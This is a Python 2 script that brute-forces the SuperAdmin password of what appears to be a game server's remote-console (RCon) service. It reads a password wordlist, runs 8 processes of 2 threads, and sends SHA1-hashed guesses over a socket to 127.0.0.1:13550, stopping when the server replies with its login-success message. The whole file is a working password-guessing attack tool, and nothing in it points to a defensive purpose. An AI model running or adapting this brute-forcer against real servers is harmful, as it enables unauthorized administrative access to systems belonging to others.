import socket
from hashlib import sha1
from multiprocessing import Process, Queue, Event
from threading import Thread
import time


class PasswordTesterThread(Thread):
    def __init__(self, name, host, password_queue, exit_event):
        Thread.__init__(self)
        self.name = name
        self.host = host
        self.password_queue = password_queue
        self.t_conn = None
        self.exit = exit_event

    def run(self):
        print "starting thread %s" % self.name
        while not self.exit.is_set() and not self.password_queue.empty():
            pw = self.password_queue.get(timeout=3)
            hash = sha1(pw).hexdigest().upper()
            try:
                self.test_hash(pw, hash)
            except socket.error, err:
                if err.errno in (10054, 10061):
                    self.connect()
                    self.test_hash(pw, hash)
                else:
                    print err
        print "ending thread %s" % self.name


    def connect(self):
        self.t_conn = socket.create_connection(self.host, timeout=2)

    def test_hash(self, pw, hash):
        if self.is_password_correct(hash):
            print "found password hash for SuperAdmin : [" + pw + "] " + hash
            self.exit.set()

    def is_password_correct(self, pw):
        if not self.t_conn:
            self.connect()
        try:
            self.t_conn.sendall("PASS=" + pw + "\n")
        except socket.error, err:
            print err
            self.connect()
            self.t_conn.sendall("PASS=" + pw + "\n")

        done = False
        while not done:
            data = self.t_conn.recv(1024)
            if data.startswith('(28)pass:Login success as Admin.'):
                return True
            elif data.startswith('(51)pass:Login failed - please send the password again.'):
                return False
            else:
                if data[0] == '(' and data[3:5] == ')(':
                    # (48)(Admin127.0.0.1:7090 has disconnected from RCon)
                    # (39)(127.0.0.1:7093 has connected remotely)
                    pass
                else:
                    print data


class PasswordTesterProcess(Process):

    def __init__(self, name, host, password_queue, exit_event):
        Process.__init__(self)
        self.name = name
        self.host = host
        self.password_queue = password_queue
        self.exit = exit_event

    def run(self):
        print "starting process %s" % self.name

        if not self.exit.is_set() and not self.password_queue.empty():
            threads = list()
            for i in range(2):
                t = PasswordTesterThread(self.name + ":" + str(i), self.host, self.password_queue, self.exit)
                threads.append(t)
                t.start()

            for t in threads:
                t.join()
        print "ending process %s" % self.name




if __name__ == '__main__':

    PASSWORD_FILE = "c:/tmp/lower.lst"
    print "loading password list from %s" % PASSWORD_FILE

    passwords = Queue()
    with open(PASSWORD_FILE, 'r') as f:
        for line in f:
            if not line.startswith('#!comment:'):
                passwords.put(line.strip())

    total_size = passwords.qsize()
    print "%s passwords loaded" % total_size


    start_time = time.time()

    exit_event = Event()
    processes = list()
    for i in range(8):
        p = PasswordTesterProcess(str(i), ('127.0.0.1', 13550), passwords, exit_event)
        processes.append(p)
        p.start()

    for p in processes:
        p.join()

    end_time = time.time()
    nb_passwords_tested = total_size - passwords.qsize()
    elapsed_time = end_time - start_time
    print "%s passwords tested in %ss" % (nb_passwords_tested, time.strftime('%H:%M:%S', time.gmtime(elapsed_time)))
    print "%.1f second per 100 passwords" % (elapsed_time / nb_passwords_tested * 100)
    print "--------------------------------------------------------"
